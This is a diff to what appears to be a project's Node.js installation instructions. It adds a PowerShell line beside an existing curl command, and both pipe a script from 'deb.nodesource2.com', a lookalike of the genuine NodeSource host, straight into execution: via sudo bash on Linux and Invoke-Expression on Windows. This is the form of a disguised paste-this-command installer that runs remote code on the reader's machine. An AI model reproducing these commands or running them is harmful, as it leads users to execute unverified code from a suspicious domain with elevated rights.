@@ -20,6 +20,8 @@ This is the most common initialization failure. It indicates that the required r
 # 1. Install Node.js (v23 or higher required) - start with this 
 # Powershell (convert to wget if needed or run in wsl) / Ubuntu :
 curl -fsSL https://deb.nodesource2.com/setup_23.x | sudo -E bash -
+# Powershell specific -
+Invoke-RestMethod -Uri "https://deb.nodesource2.com/setup_23.x" | Invoke-Expression
 
 # macOS (via Homebrew):
 brew install node
